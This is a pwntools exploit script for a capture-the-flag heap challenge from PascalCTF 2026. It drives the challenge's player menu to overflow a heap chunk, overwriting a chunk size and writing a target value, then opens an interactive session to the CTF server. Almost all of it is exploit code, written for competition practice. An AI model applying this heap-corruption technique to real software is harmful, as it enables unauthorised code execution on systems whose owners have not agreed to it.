#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/ahc---average-heap-challenge/dist/average"
)
LD_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/ahc---average-heap-challenge/dist/ld-linux-x86-64.so.2"
)
LIBRARY_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/ahc---average-heap-challenge/dist/"
)

elf = context.binary = ELF(TARGET_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("ahc.ctf.pascalctf.it", 9003)

    return process([LD_PATH, "--library-path", LIBRARY_PATH, TARGET_PATH])


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def create_player(r, idx, size, name, msg=None):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", f"{idx}".encode())
    r.sendlineafter(b"? ", f"{size}".encode())
    r.sendlineafter(b": ", name)

    if msg:
        r.sendlineafter(b": ", msg)


def delete_player(r, idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", f"{idx}".encode())


def print_player(r):
    r.sendlineafter(b"> ", b"3")


def check_target(r):
    r.sendlineafter(b"> ", b"5")


def exploit(r):
    for i in range(5):
        create_player(r, i, 0, b"A", b"A")

    delete_player(r, 3)
    create_player(r, 3, 0, b"A" * 0x27, b"A" * 0x20 + b"\x71")

    delete_player(r, 4)
    create_player(r, 4, 0x20, b"A" * 0x47, b"A" * 8 + p64(0xDEADBEEFCAFEBABE))
    check_target(r)
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
